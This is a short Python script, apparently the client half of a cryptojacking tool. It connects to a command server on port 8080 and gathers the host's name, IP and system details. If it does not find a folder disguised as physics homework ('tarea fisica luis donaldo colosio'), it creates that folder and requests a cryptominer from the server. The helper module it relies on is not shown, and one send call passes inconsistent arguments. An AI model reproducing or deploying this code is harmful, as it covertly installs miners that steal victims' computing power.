import socket
import tools 
import time
import multiprocessing as mp
import os

def main():
    CLIENT=socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM
        )
    
    #LOCAL DATA
    HOSTNAME = socket.gethostname()
    LOCAL_IP = tools.get_local_ip(CLIENT,HOSTNAME)
    BUFFER_SIZE = 4096 #KB
    SYSTEM_INFO = tools.get_system_info()

    #SERVER DATA 
    SERVER_IP = tools.locate_server()
    SERVER_PORT = 8080
    #CLIENT.settimeout(20)
    
    print(f"[+] Stablishing connection with {SERVER_IP} on port {SERVER_PORT}")
    
    #CONNECT TO THE SERVER
    CLIENT.connect((SERVER_IP,SERVER_PORT))    

    print(f"[+] Connection with {SERVER_IP} on port {SERVER_PORT}")
    
    #SEND SYSTEM_INFO
    #tools.send_data(CLIENT,LOCAL_IP,SYSTEM_INFO)

    
    #CHECK IF THE CRYPTOMINER IS INSTALLED
    current_working_dir = os.getcwd()

    if "tarea fisica luis donaldo colosio" not in os.listdir(current_working_dir): 
        os.mkdir("tarea fisica luis donaldo colosio")
        os.chdir(f"{current_working_dir}/tarea fisica luis donaldo colosio")
        tools.send_data('request_cryptominer')
    
    #RECEIVE DATA
    tools.receive_data(CLIENT,LOCAL_IP,BUFFER_SIZE)
    

    CLIENT.close()
    print(f"[-] Connection with {SERVER_IP} closed.")

try:
    main()
except KeyboardInterrupt:
    print("Bye uwuwu") 
